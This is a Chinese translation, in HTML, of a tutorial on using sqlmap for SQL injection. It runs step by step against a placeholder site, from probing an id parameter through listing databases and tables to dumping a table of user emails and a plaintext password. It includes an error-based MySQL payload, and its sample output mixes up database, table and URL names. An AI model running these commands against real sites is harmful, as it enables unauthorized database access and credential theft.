<html>
<head>
<title>How hackers perform SQL injection attack using sqlmap</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客如何利用 sqlmap 实施 SQL 注入攻击</h1>
<blockquote>原文：<a href="https://medium.com/nerd-for-tech/how-hackers-perform-sql-injection-attack-using-sqlmap-dfb08519dc99?source=collection_archive---------2-----------------------#2021-05-23">https://medium.com/nerd-for-tech/how-hackers-perform-sql-injection-attack-using-sqlmap-dfb08519dc99?source=collection_archive---------2-----------------------#2021-05-23</a></blockquote><div><div class="ds gw gx gy gz ha"/><div class="hb hc hd he hf"><div class=""/><figure class="ev ex ig ih ii ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es if"><img src="../Images/39f114028d01b669e66d2f71104a80be.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*i7c7u0sIVdd7a9KrqvLOBg.jpeg"/></div></div></figure><p id="b8ba" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">SQL(结构化查询语言)是一种用于管理存储在数据库中的数据的编程语言。这通常会被攻击者滥用，如果网站没有对用户输入进行净化，这种情况也会被利用。这些数据可能包括任意数量的项目，包括敏感的公司数据、用户列表或私人客户详细信息。</p><p id="a90e" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">攻击者可以对易受攻击的网站执行恶意的 SQL 查询，并可以检索、编辑或删除这些表。这些查询可以由名为 sqlmap 的工具自动生成和执行。</p><p id="0f5b" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">sqlmap 是一个开源的渗透测试工具，它自动执行检测和利用 SQL 注入漏洞以及接管数据库服务器的过程。Sqlmap 甚至可以在一组特定的条件下写入特定的数据库。Sqlmap 带有强大的检测引擎和各种开关，有助于执行有效的攻击。</p><p id="2d78" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">在这篇文章中，我们将攻击一个测试网站，我会引导你通过它。</p><p id="706b" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">假设我们要攻击这个易受攻击的站点，您可以使用下面的命令获得 sqlmap 中存在的开关的信息。</p><pre class="jo jp jq jr fd js jt ju jv aw jw bi"><span id="29a9" class="jx jy hi jt b fi jz ka l kb kc">root@kali:~# sqlmap --help</span></pre><p id="4bb1" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">所以我会黑一个测试网站，并演示给你看。</p><h1 id="3ae1" class="kd jy hi bd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz bi translated">识别漏洞</h1><p id="30aa" class="pw-post-body-paragraph iq ir hi is b it la iv iw ix lb iz ja jb lc jd je jf ld jh ji jj le jl jm jn hb bi translated">首先，我们需要检查网站是否容易受到 SQL 攻击。</p><pre class="jo jp jq jr fd js jt ju jv aw jw bi"><span id="08fa" class="jx jy hi jt b fi jz ka l kb kc">http://www.site.com/test.php?id=1</span></pre><p id="ccbc" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">这是我们的测试网站，你可以看到网站公开了它不应该公开的参数 id。因此，我们可以通过在 ID 后面加上单引号来识别漏洞。</p><pre class="jo jp jq jr fd js jt ju jv aw jw bi"><span id="cad8" class="jx jy hi jt b fi jz ka l kb kc">http://www.site.com/test.php?id=1'</span></pre><p id="5afd" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">如果网站对错误做出响应或做出任何不当行为，我们可以确认该网站容易受到 SQL 攻击。我们的网站出现了错误，因此容易受到 SQL 攻击。</p><h1 id="f981" class="kd jy hi bd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz bi translated">攻击网站</h1><p id="7e16" class="pw-post-body-paragraph iq ir hi is b it la iv iw ix lb iz ja jb lc jd je jf ld jh ji jj le jl jm jn hb bi translated">既然我们知道网站易受攻击，我们可以继续攻击网站。</p><h2 id="424f" class="jx jy hi bd ke lf lg lh ki li lj lk km jb ll lm kq jf ln lo ku jj lp lq ky lr bi translated">扫描网站</h2><p id="bb84" class="pw-post-body-paragraph iq ir hi is b it la iv iw ix lb iz ja jb lc jd je jf ld jh ji jj le jl jm jn hb bi translated">我们可以通过使用以下命令扫描网站来进行双重检查。</p><pre class="jo jp jq jr fd js jt ju jv aw jw bi"><span id="7a9b" class="jx jy hi jt b fi jz ka l kb kc"><strong class="jt hj">$ python sqlmap.py -u "http://www.site.com/test.php?id=1"</strong></span></pre><p id="8ede" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">SQLmap 将使用其强大的搜索引擎扫描整个网站，它扫描目标系统上运行的操作系统版本，并返回以下信息。</p><pre class="jo jp jq jr fd js jt ju jv aw jw bi"><span id="b347" class="jx jy hi jt b fi jz ka l kb kc"><strong class="jt hj">[*] starting at 12:10:33<br/>[12:10:33] [INFO] resuming back-end DBMS 'mysql'<br/>[12:10:34] [INFO] testing connection to the target url<br/>sqlmap identified the following injection points with a total of 0 HTTP(s) requests:<br/>---<br/>Place: GET<br/>Parameter: id<br/>    Type: error-based<br/>    Title: MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause<br/>    Payload: id=51 AND (SELECT 1489 FROM(SELECT COUNT(*),CONCAT(0x3a73776c3a,(SELECT (CASE WHEN (1489=1489) THEN 1 ELSE 0 END)),0x3a7a76653a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)<br/>---<br/>[12:10:37] [INFO] the back-end DBMS is MySQL<br/>web server operating system: FreeBSD<br/>web application technology: Apache 2.2.22<br/>back-end DBMS: MySQL 5</strong></span></pre><p id="399d" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">我们知道该网站易受攻击，所以让我们搜索一个可用的数据库。</p><pre class="jo jp jq jr fd js jt ju jv aw jw bi"><span id="5a22" class="jx jy hi jt b fi jz ka l kb kc"><strong class="jt hj">$ python sqlmap.py -u "http://www.sitemap.com/test.php?id=1" --dbs</strong></span></pre><p id="1d33" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">该命令将扫描整个目标系统，并列出可用的数据库。</p><pre class="jo jp jq jr fd js jt ju jv aw jw bi"><span id="1c25" class="jx jy hi jt b fi jz ka l kb kc"><strong class="jt hj">[*] starting at 12:12:56<br/>[12:12:56] [INFO] resuming back-end DBMS 'mysql'<br/>[12:12:57] [INFO] testing connection to the target url<br/>sqlmap identified the following injection points with a total of 0 HTTP(s) requests:<br/>---<br/>Place: GET<br/>Parameter: id<br/>    Type: error-based<br/>    Title: MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause<br/>    Payload: id=51 AND (SELECT 1489 FROM(SELECT COUNT(*),CONCAT(0x3a73776c3a,(SELECT (CASE WHEN (1489=1489) THEN 1 ELSE 0 END)),0x3a7a76653a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)<br/>---<br/>[12:13:00] [INFO] the back-end DBMS is MySQL<br/>web server operating system: FreeBSD<br/>web application technology: Apache 2.2.22<br/>back-end DBMS: MySQL 5<br/>[12:13:00] [INFO] fetching database names<br/>[12:13:00] [INFO] the SQL query used returns 2 entries<br/>[12:13:00] [INFO] resumed: information_schema<br/>[12:13:00] [INFO] resumed: safecosmetics<br/>available databases [2]:<br/>[*] information_schema<br/>[*] sedulousrams</strong></span></pre><p id="9946" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">在这里，您可以看到它列出了可用的数据库<strong class="is hj"> sedulousrams </strong>似乎很有趣，所以让我们使用以下命令来查看该数据库中可用的表。</p><h2 id="5d04" class="jx jy hi bd ke lf lg lh ki li lj lk km jb ll lm kq jf ln lo ku jj lp lq ky lr bi translated">在数据库中查找表</h2><p id="4cbf" class="pw-post-body-paragraph iq ir hi is b it la iv iw ix lb iz ja jb lc jd je jf ld jh ji jj le jl jm jn hb bi translated">让我们用下面的命令在<strong class="is hj"> sedulousrams </strong>数据库中搜索表。</p><pre class="jo jp jq jr fd js jt ju jv aw jw bi"><span id="117d" class="jx jy hi jt b fi jz ka l kb kc"><strong class="jt hj">$ python sqlmap.py -u "http://www.site.com/test.php?id=1" --tables -D sedulousrams</strong></span></pre><p id="4687" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">网站返回了以下输出</p><pre class="jo jp jq jr fd js jt ju jv aw jw bi"><span id="6ecb" class="jx jy hi jt b fi jz ka l kb kc"><strong class="jt hj">[11:55:18] [INFO] the back-end DBMS is MySQL<br/>web server operating system: FreeBSD<br/>web application technology: Apache 2.2.22<br/>back-end DBMS: MySQL 5<br/>[11:55:18] [INFO] fetching tables for database: 'safecosmetics'<br/>[11:55:19] [INFO] heuristics detected web page charset 'ascii'<br/>[11:55:19] [INFO] the SQL query used returns 216 entries<br/>[11:55:20] [INFO] retrieved: acl_acl<br/>[11:55:21] [INFO] retrieved: acl_acl_sections<br/>[11:55:21] [INFO] retrieved: userinfo<br/>........... more tables</strong></span></pre><p id="06c1" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">在这些返回的表中，<strong class="is hj"> userinfo </strong>表似乎是一个有趣的表。因此，我们将使用下面的命令来看看它有哪些列。</p><h2 id="5911" class="jx jy hi bd ke lf lg lh ki li lj lk km jb ll lm kq jf ln lo ku jj lp lq ky lr bi translated">在表中搜索列</h2><p id="ec52" class="pw-post-body-paragraph iq ir hi is b it la iv iw ix lb iz ja jb lc jd je jf ld jh ji jj le jl jm jn hb bi translated">我们将使用下面的命令来查看<strong class="is hj"> userinfo </strong>表中的列。</p><pre class="jo jp jq jr fd js jt ju jv aw jw bi"><span id="6b89" class="jx jy hi jt b fi jz ka l kb kc"><strong class="jt hj">$ python sqlmap.py -u "http://www.site.com/section.php?id=1" --columns -D sedulousrams -T userinfo</strong></span></pre><p id="b53c" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">输出</p><pre class="jo jp jq jr fd js jt ju jv aw jw bi"><span id="40b4" class="jx jy hi jt b fi jz ka l kb kc"><strong class="jt hj">[12:17:39] [INFO] the back-end DBMS is MySQL<br/>web server operating system: FreeBSD<br/>web application technology: Apache 2.2.22<br/>back-end DBMS: MySQL 5<br/>[12:17:39] [INFO] fetching columns for table 'users' in database 'sedulousrams'<br/>[12:17:41] [INFO] heuristics detected web page charset 'ascii'<br/>[12:17:41] [INFO] the SQL query used returns 8 entries<br/>[12:17:42] [INFO] retrieved: id<br/>[12:17:43] [INFO] retrieved: int(11)<br/>[12:17:45] [INFO] retrieved: name<br/>[12:17:46] [INFO] retrieved: text<br/>[12:17:47] [INFO] retrieved: password<br/>[12:17:48] [INFO] retrieved: text<br/>.......<br/>[12:17:59] [INFO] retrieved: hash<br/>[12:18:01] [INFO] retrieved: varchar(128)<br/>Database: sedulousrams<br/>Table: users<br/>[8 columns]<br/>+-------------------+--------------+<br/>| Column            | Type         |<br/>+-------------------+--------------+<br/>| email             | text         |<br/>| id                | int(11)      |<br/>| name              | text         |<br/>| password          | text         |<br/>+-------------------+--------------+</strong></span></pre><p id="679f" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">它返回了一些有趣的信息，但是你知道下面的命令会返回比这个更多的信息，即用户 id 和密码。</p><h2 id="9cdf" class="jx jy hi bd ke lf lg lh ki li lj lk km jb ll lm kq jf ln lo ku jj lp lq ky lr bi translated">扔掉桌子</h2><p id="d21b" class="pw-post-body-paragraph iq ir hi is b it la iv iw ix lb iz ja jb lc jd je jf ld jh ji jj le jl jm jn hb bi translated">下一个明显的步骤是转储表格，这将允许我们看到实际的电子邮件和密码！</p><p id="5a93" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">命令</p><pre class="jo jp jq jr fd js jt ju jv aw jw bi"><span id="37a1" class="jx jy hi jt b fi jz ka l kb kc">$ python sqlmap.py -u "http://www.site.com/section.php?id=51" --dump -D sedulousrams -T userinfo</span></pre><p id="e311" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">这就是我们期待的精彩输出。</p><pre class="jo jp jq jr fd js jt ju jv aw jw bi"><span id="6626" class="jx jy hi jt b fi jz ka l kb kc"><strong class="jt hj">+----+-----------+---------------+----------+<br/>| id | name      |     email     | password | <br/>+----+-----------+---------------+----------+<br/>| 1  | admin     |admin@site.com | imsmart  |        <br/>+----+-----------+---------------+----------+</strong></span></pre><p id="5fa4" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">在这里，你有它，电子邮件 id 和密码，因为你可以看到这是多么可怕的容易黑客攻击 SQL 易受攻击的网站，所以在它被黑客攻击之前保护你的网站！</p></div><div class="ab cl ls lt gp lu" role="separator"><span class="lv bw bk lw lx ly"/><span class="lv bw bk lw lx ly"/><span class="lv bw bk lw lx"/></div><div class="hb hc hd he hf"><p id="9f48" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">感谢阅读</p></div></div>    
</body>
</html>